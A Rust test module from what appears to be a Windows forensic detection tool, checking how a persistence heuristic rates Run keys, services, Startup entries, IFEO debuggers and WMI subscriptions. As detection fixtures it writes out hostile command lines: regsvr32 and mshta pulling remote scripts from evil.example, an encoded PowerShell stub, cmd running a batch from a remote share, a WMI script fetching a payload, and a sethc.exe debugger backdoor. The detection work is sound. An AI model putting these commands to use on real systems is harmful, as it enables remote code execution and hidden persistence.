            r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
        ] {
            let lnk = format!(r"{dir}\AnyDesk.lnk");
            let startup_shortcut = full_rec(
                Mechanism::Startup,
                None,
                Some(&lnk),
                Some(&lnk),
                Some(false),
                Some(now),
            );
            assert!(
                evaluate_gate(&startup_shortcut, now).is_empty(),
                "the .lnk's own location must not fire S2/S3/S4: {dir}"
            );
        }
    }

    /// The Startup folder is no longer exempt: a resolved target, or a binary dropped
    /// straight into the folder, is judged like any other mechanism's binary.
    #[test]
    fn gate_startup_judges_the_target_binary() {
        let now = Utc::now();
        // resolved .lnk target: unsigned binary in AppData -> S2 High
        let target = full_rec(
            Mechanism::Startup,
            Some("Updater.lnk"),
            Some(r"C:\Users\a\AppData\Roaming\upd\upd.exe"),
            Some(r"C:\Users\a\AppData\Roaming\upd\upd.exe"),
            Some(false),
            None,
        );
        let hits = evaluate_gate(&target, now);
        assert!(hits
            .iter()
            .any(|h| h.mitre == "T1036" && h.severity == Severity::High));
        // exe dropped straight into the per-user Startup folder, unverifiable, recent
        let exe = r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.exe";
        let dropped = full_rec(
            Mechanism::Startup,
            Some("x.exe"),
            Some(exe),
            Some(exe),
            None,
            Some(now - Duration::days(1)),
        );
        assert_eq!(evaluate_gate(&dropped, now)[0].severity, Severity::Medium);
        // script file straight in the folder -> S6 Medium even when old
        let vbs =
            r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.vbs";
        let script = full_rec(
            Mechanism::Startup,
            Some("run.vbs"),
            Some(vbs),
            Some(vbs),
            None,
            Some(now - Duration::days(300)),
        );
        let hits = evaluate_gate(&script, now);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].mitre, "T1547.001");
        // interpreter with a drop-zone script argument -> S5 High
        let wsh = full_rec(
            Mechanism::Startup,
            Some("Sync.lnk"),
            Some(r"C:\Windows\System32\wscript.exe C:\Users\a\AppData\Local\Temp\s.vbs"),
            Some(r"C:\Windows\System32\wscript.exe"),
            Some(true),
            None,
        );
        let hits = evaluate_gate(&wsh, now);
        assert_eq!(hits.len(), 1, "S9's local-script tier folds into S5");
        assert_eq!(hits[0].severity, Severity::High);
        assert_eq!(hits[0].mitre, "T1059.005");
    }

    /// signed == Some(false) is treated like unverifiable for the recency signal.
    #[test]
    fn gate_s4_counts_explicitly_unsigned_like_unverifiable() {
        let now = Utc::now();
        let p = full_rec(
            Mechanism::Service,
            None,
            Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"),
            Some(false),
            Some(now - Duration::days(1)),
        );
        let hits = evaluate_gate(&p, now);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, Severity::Medium);
        assert!(hits[0].reason.contains("unsigned"), "{}", hits[0].reason);
    }

    /// S5: a signed System32 host is judged by its arguments.
    #[test]
    fn gate_s5_proxy_execution_by_arguments() {
        let now = Utc::now();
        let cases = [
            (
                r"rundll32.exe C:\Users\a\AppData\Local\Temp\x.dll,Start",
                r"C:\Windows\System32\rundll32.exe",
                "T1218.011",
            ),
            (
                r"regsvr32 /s /n /u /i:https://evil.example/x.sct scrobj.dll",
                r"C:\Windows\System32\regsvr32.exe",
                "T1218.010",
            ),
            (
                r#"msiexec /q /i "%TEMP%\setup.msi""#,
                r"C:\Windows\System32\msiexec.exe",
                "T1218.007",
            ),
            (
                r"powershell.exe -NoP -File C:\Users\Public\a.ps1",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "T1059.001",
            ),
            (
                r"cmd.exe /c \\203.0.113.7\share\a.bat",
                r"C:\Windows\System32\cmd.exe",
                "T1059.003",
            ),
        ];
        for (cmd, bin, mitre) in cases {
            let p = full_rec(
                Mechanism::RunKey,
                Some("x"),
                Some(cmd),
                Some(bin),
                Some(true),
                None,
            );
            let hits = evaluate_gate(&p, now);
            assert!(
                hits.iter()
                    .any(|h| h.mitre == mitre && h.severity == Severity::High),
                "{cmd}: {:?}",
                hits.iter().map(|h| &h.reason).collect::<Vec<_>>()
            );
        }
        // stock uses stay inventory
        for (cmd, bin) in [
            (
                "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
                r"C:\Windows\System32\rundll32.exe",
            ),
            (
                r#"msiexec /i "C:\Program Files\V\v.msi""#,
                r"C:\Windows\System32\msiexec.exe",
            ),
        ] {
            let p = full_rec(
                Mechanism::RunKey,
                Some("x"),
                Some(cmd),
                Some(bin),
                Some(true),
                None,
            );
            assert!(evaluate_gate(&p, now).is_empty(), "{cmd}");
        }
        // mshta + URL: one fact, reported once (S9's remote tier), not S5 again
        let p = full_rec(
            Mechanism::RunKey,
            Some("x"),
            Some("mshta.exe https://evil.example/a.hta"),
            Some(r"C:\Windows\System32\mshta.exe"),
            Some(true),
            None,
        );
        let hits = evaluate_gate(&p, now);
        assert_eq!(
            hits.len(),
            1,
            "{:?}",
            hits.iter().map(|h| &h.reason).collect::<Vec<_>>()
        );
        assert_eq!(hits[0].severity, Severity::High);
    }

    /// A demand-start service with a single signal is lowered one band; with two
    /// signals, or with an unknown start type, nothing changes.
    #[test]
    fn demand_start_service_lowers_only_a_single_signal() {
        let svc = full_rec(Mechanism::Service, None, None, None, None, None);
        assert!(demand_start_lowers(&svc, Some(3), 1));
        assert!(!demand_start_lowers(&svc, Some(3), 2));
        assert!(!demand_start_lowers(&svc, Some(2), 1));
        assert!(!demand_start_lowers(&svc, None, 1));
        let run = full_rec(Mechanism::RunKey, None, None, None, None, None);
        assert!(!demand_start_lowers(&run, Some(3), 1));
        assert_eq!(service_start_type(&svc), None, "no start-type field yet");
    }

    /// S3 now reaches inside the Windows tree: svchost.exe in C:\Windows\Temp.
    #[test]
    fn gate_s3_masquerade_inside_windows_tree() {
        let now = Utc::now();
        let p = full_rec(
            Mechanism::Service,
            None,
            Some(r"C:\Windows\Temp\svchost.exe"),
            Some(r"C:\Windows\Temp\svchost.exe"),
            Some(true),
            None,
        );
        assert!(evaluate_gate(&p, now)
            .iter()
            .any(|h| h.mitre == "T1036.005"));
    }

    #[test]
    fn gate_s3_masquerade_absolute_only() {
        let now = Utc::now();
        let fake = full_rec(
            Mechanism::Service,
            None,
            Some(r"C:\ProgramData\svchost.exe"),
            Some(r"C:\ProgramData\svchost.exe"),
            None,
            None,
        );
        assert!(evaluate_gate(&fake, now)
            .iter()
            .any(|h| h.mitre == "T1036.005"));
        let bare = full_rec(
            Mechanism::Winlogon,
            Some("Shell"),
            Some("explorer.exe"),
            Some("explorer.exe"),
            None,
            None,
        );
        // bare name: winlogon default -> no S1a; not absolute -> no S3
        assert!(evaluate_gate(&bare, now).is_empty());
    }

    #[test]
    fn gate_s4_needs_all_three_conditions() {
        let now = Utc::now();
        let recent = Some(now - Duration::days(2));
        let hit = full_rec(
            Mechanism::Service,
            None,
            Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"),
            None,
            recent,
        );
        assert_eq!(evaluate_gate(&hit, now)[0].severity, Severity::Medium);
        // signed -> no S4 (ASUS update-day services)
        let signed = full_rec(
            Mechanism::Service,
            None,
            Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"),
            Some(true),
            recent,
        );
        assert!(evaluate_gate(&signed, now).is_empty());
        // system path -> no S4 (per-user svchost instances)
        let sys = full_rec(
            Mechanism::Service,
            None,
            Some(r"C:\Windows\System32\svchost.exe -k X"),
            Some(r"C:\Windows\System32\svchost.exe"),
            None,
            recent,
        );
        assert!(evaluate_gate(&sys, now).is_empty());
        // old -> no S4
        let old = full_rec(
            Mechanism::Service,
            None,
            Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"),
            None,
            Some(now - Duration::days(300)),
        );
        assert!(evaluate_gate(&old, now).is_empty());
    }

    /// Regression: a Run key running `powershell -e <base64>` (PowerShell's short
    /// encoded flag) was plain inventory — no S9 hit at all.
    #[test]
    fn gate_s9_short_encoded_flag_is_high() {
        let now = Utc::now();
        let p = full_rec(
            Mechanism::RunKey,
            Some("U"),
            Some("powershell.exe -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            Some(true),
            None,
        );
        let hits = evaluate_gate(&p, now);
        assert!(
            hits.iter()
                .any(|h| h.severity == Severity::High && h.mitre == "T1059"),
            "{:?}",
            hits.iter().map(|h| &h.reason).collect::<Vec<_>>()
        );
        // noise: a plain PowerShell script from Program Files stays below High
        let plain = full_rec(
            Mechanism::RunKey,
            Some("U"),
            Some(r#"powershell.exe -ExecutionPolicy Bypass -File "C:\Program Files\V\start.ps1""#),
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            Some(true),
            None,
        );
        assert!(evaluate_gate(&plain, now)
            .iter()
            .all(|h| h.severity != Severity::High));
    }

    #[test]
    fn gate_s9_script_persistence_tiers() {
        let now = Utc::now();
        let enc = full_rec(
            Mechanism::RunKey,
            Some("U"),
            Some("powershell.exe -NoP -Enc SQBFAFgA"),
            None,
            None,
            None,
        );
        let h = evaluate_gate(&enc, now);
        assert_eq!(h[0].severity, Severity::High);
        let remote = full_rec(
            Mechanism::RunKey,
            Some("U"),
            Some(r"mshta.exe https://evil.tld/x.hta"),
            None,
            None,
            None,
        );
        assert_eq!(evaluate_gate(&remote, now)[0].severity, Severity::High);
        let local = full_rec(
            Mechanism::ScheduledTask,
            None,
            Some(r"wscript.exe C:\Scripts\backup.vbs"),
            Some(r"C:\Windows\System32\wscript.exe"),
            Some(true),
            None,
        );
        assert_eq!(evaluate_gate(&local, now)[0].severity, Severity::Low);
        // interpreter-in-vendor-name must NOT fire (substring guard)
        let studio = full_rec(
            Mechanism::RunKey,
            Some("PS"),
            Some(r"C:\Program Files\PowerShell Studio\app.exe --serve"),
            Some(r"C:\Program Files\PowerShell Studio\app.exe"),
            Some(true),
            None,
        );
        assert!(evaluate_gate(&studio, now).is_empty());
    }

    #[test]
    fn gate_service_and_runkey_existence_is_inventory() {
        let now = Utc::now();
        // The 25-Low class from the 2026-06-28 run: plain third-party service.
        let svc = full_rec(
            Mechanism::Service,
            None,
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(true),
            Some(now - Duration::days(400)),
        );
        assert!(evaluate_gate(&svc, now).is_empty());
        // The 13-Medium class: same service on update day (recent) — still inventory.
        let svc_recent = full_rec(
            Mechanism::Service,
            None,
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(true),
            Some(now - Duration::days(2)),
        );
        assert!(evaluate_gate(&svc_recent, now).is_empty());
    }

    // ── analyze/observe split + cross-artifact corroboration ────────────────

    fn wrap(p: PersistenceRecord) -> Record {
        Record::Persistence(p)
    }

    #[test]
    fn analyze_emits_only_gated_and_observe_gets_the_rest() {
        let now = Utc::now();
        let records = vec![
            wrap(full_rec(
                Mechanism::RunKey,
                Some("Upd"),
                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                Some(false),
                Some(now),
            )),
            wrap(full_rec(
                Mechanism::Service,
                None,
                Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
                Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
                Some(true),
                Some(now),
            )),
        ];
        let findings = PersistHeuristic.analyze(&records, &[]).unwrap();
        assert_eq!(findings.len(), 1, "only the S2 hit is a finding");
        assert_eq!(findings[0].severity, Severity::High);
        let obs = PersistHeuristic.observe(&records).unwrap();
        assert_eq!(obs.len(), 1, "the clean service is inventory");
        assert_eq!(obs[0].category, "service");
    }

    #[test]
    fn execution_corroboration_escalates_and_adds_evidence() {
        use cairn_core::record::ExecutionRecord;
        let now = Utc::now();
        let records = vec![
            wrap(full_rec(
                Mechanism::RunKey,
                Some("U"),
                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                Some(false),
                Some(now),
            )),
            Record::Execution(ExecutionRecord {
                source: "prefetch".into(),
                path: "E.EXE".into(),
                first_run: None,
                last_run: Some(now),
                run_count: Some(3),
                sha1: None,
                user_sid: None,
                execution_confirmed: Some(true),
                full_path: None,
            }),
        ];
        let findings = PersistHeuristic.analyze(&records, &[]).unwrap();
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::Critical,
            "S2 High + exec corroboration"
        );
        assert!(findings[0]
            .evidence
            .iter()
            .any(|e| e.artifact == "prefetch"));
        assert!(findings[0].evidence.iter().any(|e| e.artifact == "run_key"));
        assert!(findings[0]
            .reason
            .as_deref()
            .unwrap()
            .contains("corroborated"));
    }

    /// Regression: a persistence entry run through a shared host (powershell,
    /// rundll32, ...) was "corroborated — escalated" by the host's prefetch entry or by
    /// any running instance of it, which every Windows machine has.
    #[test]
    fn launcher_host_is_not_corroborated_by_unrelated_runs() {
        use cairn_core::record::ExecutionRecord;
        let now = Utc::now();
        let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
        let cmd = "powershell.exe -NoP -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA";
        let entry = wrap(full_rec(
            Mechanism::RunKey,
            Some("U"),
            Some(cmd),
            Some(ps),
            Some(true),
            None,
        ));
        let prefetch = Record::Execution(ExecutionRecord {
            source: "prefetch".into(),
            path: "POWERSHELL.EXE".into(),
            first_run: None,
            last_run: Some(now),
            run_count: Some(40),
            sha1: None,
            user_sid: None,
            execution_confirmed: Some(true),
            full_path: None,
        });
        let proc_with = |cmdline: &str| {
            Record::Process(ProcessRecord {
                pid: 77,
                ppid: 1,
                image: ps.into(),
                cmdline: cmdline.into(),
                signed: Some(true),
                signer: None,
                binary_sha256: None,
                integrity: None,
                user: None,
                start_time: None,
                signer_source: None,
            })
        };
        let f = PersistHeuristic
            .analyze(
                &[
                    entry.clone(),
                    prefetch,
                    proc_with("powershell.exe -File C:\\it\\inventory.ps1"),
                ],
                &[],
            )
            .unwrap();
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High, "{:?}", f[0].reason);
        assert!(!f[0].reason.as_deref().unwrap().contains("corroborated"));
        // The same command line actually running does corroborate.
        let f = PersistHeuristic
            .analyze(
                &[
                    entry,
                    proc_with("powershell.exe  -NoP -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
                ],
                &[],
            )
            .unwrap();
        assert_eq!(f[0].severity, Severity::Critical);
        assert!(f[0]
            .reason
            .as_deref()
            .unwrap()
            .contains("currently running"));
    }

    /// Regression: an IFEO debugger on sethc.exe produced the accessibility hit AND the
    /// generic IFEO hit for the same registry value, and "2 independent signals —
    /// escalated" turned one fact into Critical.
    #[test]
    fn accessibility_ifeo_is_one_signal() {
        let now = Utc::now();
        let mut p = full_rec(
            Mechanism::Ifeo,
            Some("sethc.exe"),
            Some(r"C:\Windows\System32\cmd.exe"),
            Some(r"C:\Windows\System32\cmd.exe"),
            Some(true),
            None,
        );
        let hits = evaluate_gate(&p, now);
        assert_eq!(
            hits.len(),
            1,
            "{:?}",
            hits.iter().map(|h| &h.reason).collect::<Vec<_>>()
        );
        assert_eq!(hits[0].mitre, "T1546.008");
        let f = PersistHeuristic.analyze(&[wrap(p.clone())], &[]).unwrap();
        assert_eq!(f[0].severity, Severity::High);
        // A real second fact (unsigned payload in a drop zone) still escalates.
        p.command = Some(r"C:\Users\Public\x.exe".into());
        p.binary_path = Some(r"C:\Users\Public\x.exe".into());
        p.signed = Some(false);
        let f = PersistHeuristic.analyze(&[wrap(p)], &[]).unwrap();
        assert_eq!(f[0].severity, Severity::Critical);
        // A generic IFEO still gets its S1b hit.
        let generic = full_rec(
            Mechanism::Ifeo,
            Some("notepad.exe"),
            Some(r"C:\Program Files\NPP\npp.exe"),
            Some(r"C:\Program Files\NPP\npp.exe"),
            Some(true),
            None,
        );
        assert_eq!(evaluate_gate(&generic, now)[0].mitre, "T1546.012");
    }

    /// Non-adjacent duplicate techniques collapse (Vec::dedup kept them).
    #[test]
    fn finding_mitre_has_no_duplicates() {
        // policy Run (T1547.001) + masquerade (T1036.005) + recent unverifiable
        // (T1547.001 again): the old dedup kept both T1547.001 entries.
        let p = full_rec(
            Mechanism::ExplorerPolicyRun,
            Some("x"),
            Some(r"C:\Users\a\svchost.exe"),
            Some(r"C:\Users\a\svchost.exe"),
            None,
            Some(Utc::now()),
        );
        assert_eq!(evaluate_gate(&p, Utc::now()).len(), 3);
        let f = PersistHeuristic.analyze(&[wrap(p)], &[]).unwrap();
        let mut seen = std::collections::HashSet::new();
        assert!(
            f[0].mitre.iter().all(|m| seen.insert(m.clone())),
            "{:?}",
            f[0].mitre
        );
    }

    #[test]
    fn details_starts_with_full_path_and_title_names_binary() {
        let now = Utc::now();
        let records = vec![wrap(full_rec(
            Mechanism::RunKey,
            Some("U"),
            Some(r"C:\Users\a\AppData\Roaming\evil.exe"),
            Some(r"C:\Users\a\AppData\Roaming\evil.exe"),
            Some(false),
            Some(now),
        ))];
        let f = &PersistHeuristic.analyze(&records, &[]).unwrap()[0];
        assert!(
            f.details
                .starts_with(r"C:\Users\a\AppData\Roaming\evil.exe |"),
            "details must lead with the path: {}",
            f.details
        );
        assert!(f.title.contains("evil.exe"), "title: {}", f.title);
    }

    #[test]
    fn winlogon_default_is_observation_with_category() {
        let now = Utc::now();
        let records = vec![wrap(full_rec(
            Mechanism::Winlogon,
            Some("Shell"),
            Some("explorer.exe"),
            Some(r"C:\Windows\explorer.exe"),
            Some(true),
            Some(now),
        ))];
        assert!(PersistHeuristic.analyze(&records, &[]).unwrap().is_empty());
        let obs = PersistHeuristic.observe(&records).unwrap();
        assert_eq!(obs[0].category, "winlogon_default");
    }

    // ── S1c: WMI event subscription persistence ─────────────────────────────

    #[test]
    fn gate_s1c_wmi_active_script_with_suspicious_content_is_high() {
        let now = Utc::now();
        let p = full_rec(
            Mechanism::WmiSubscription,
            Some("EvilConsumer"),
            Some(r#"CreateObject("Msxml2.XMLHTTP").Open("GET","http://evil.example/payload")"#),
            None,
            None,
            None,
        );
        let hits = evaluate_gate(&p, now);
        assert!(
            !hits.is_empty(),
            "WMI ActiveScript with remote content must gate"
        );
        assert!(
            hits.iter().any(|h| h.severity == Severity::High),
            "suspicious script content must be High severity"
        );
    }

    #[test]
    fn gate_s1c_wmi_active_script_benign_content_gates_but_not_high() {
        let now = Utc::now();
        let p = full_rec(
            Mechanism::WmiSubscription,
            Some("BenignConsumer"),
            Some("MsgBox \"hello\""),
            None,
            None,
            None,
        );
        let hits = evaluate_gate(&p, now);
        assert!(
            !hits.is_empty(),
            "WMI subscriptions gate unconditionally (rare mechanism)"
        );
        assert!(
            hits.iter().all(|h| h.severity != Severity::High),
            "benign script content must not be High severity"
        );
    }

    #[test]
    fn gate_s1c_wmi_command_line_consumer_with_invoked_executable_uses_existing_signals() {
        // A CommandLineEventConsumer HAS an invoked executable, so it must be evaluated by
        // the normal S2-S4/S9 path (binary_path is Some), not the unconditional S1c branch.
        let now = Utc::now();
        let p = full_rec(
            Mechanism::WmiSubscription,
            Some("Consumer"),
            Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe"),
            Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe"),
            Some(false),
            None,
        );
        let hits = evaluate_gate(&p, now);
        assert!(
            !hits.is_empty(),
            "unsigned executable in a user-writable path must still gate via S2"
        );
        assert!(
            hits.iter().all(|h| h.label != "WMI 事件訂閱腳本持久化"),
            "a CommandLineEventConsumer with binary_path must not trigger the S1c branch"
        );
    }

    #[test]
    fn wmi_subscription_uses_registry_entity_with_wmi_hive_marker() {
        let p = PersistenceRecord {
            mechanism: Mechanism::WmiSubscription,
            location: "Filter -> Consumer".into(),
            value: Some("Consumer".into()),
            command: Some("MsgBox 1".into()),
            binary_path: None,
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: None,
            bound: None,
            signer_source: None,
            service_start: None,
        };
        let entity = persistence_entity(&p);
        let reg = entity
            .registry
            .expect("wmi_subscription must populate entity.registry");
        assert_eq!(reg.hive, "WMI");
        assert_eq!(reg.key, "Filter -> Consumer");
        let pe = entity.persistence.expect("typed persistence entity");
        assert_eq!(pe.mechanism, Mechanism::WmiSubscription);
        assert_eq!(pe.location, "Filter -> Consumer");
    }
}
